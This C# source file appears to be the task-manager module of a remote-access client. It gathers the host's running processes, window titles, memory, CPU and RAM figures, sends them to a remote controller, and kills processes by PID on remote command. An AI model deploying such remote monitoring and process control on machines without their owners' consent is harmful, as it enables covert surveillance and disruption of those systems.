using boulzar.Other;
using System;
using System.Diagnostics;
namespace boulzar.Methods
{
    class taskmgr : IDisposable
    {
        public static int Cpu;
        public static void GetProcs()
        {
            Process currentProcess = Process.GetCurrentProcess();
            string pid = currentProcess.Id.ToString();
            Console.WriteLine(currentProcess.Id);
            Process[] PL = Process.GetProcesses();
            string allproc = "";
            foreach (Process P in PL)
            {
                if (P.Id == currentProcess.Id)
                {

                    allproc += "*" + P.ProcessName + "(Client)" + "*_" + P.Id + "_-" + "NA" + "-@" + P.WorkingSet64 + "@";
                    continue;
                }
                if (P.MainWindowTitle == string.Empty)
                {
                    allproc += "*" + P.ProcessName + "*_" + P.Id + "_-" + "NA" + "-@" + P.WorkingSet64 + "@";
                }

                else
                {
                    allproc += "*" + P.ProcessName + "*_" + P.Id + "_-" + P.MainWindowTitle + "-@" + P.WorkingSet64 + "@";
                }
            }

            Helpers.Send(DataType.proclist, Helpers.Getbytes(allproc));



        }
        public static void KillProc(string data)
        {
            string pid = Helpers.GetSubstringByString("{", "}", data);
            try
            {
                Process P = Process.GetProcessById(Convert.ToInt16(pid));
                P.Kill();
                Helpers.Send(DataType.Notif, Helpers.Getbytes("The process " + P.ProcessName + " was killed."));

            }
            catch { }
        }

        public static void SysRes()
        {
            string data = "";
            string s = "~";

            Cpu = Helpers.GetCpu();
            data += Helpers.GetRam();
            data += Cpu;
            Helpers.Send(DataType.procmgr_sysres, Helpers.Getbytes(data));
        }
        #region Disposition 
        public void Dispose()
        {


            GC.SuppressFinalize(this);
        }

        #endregion
    }
}
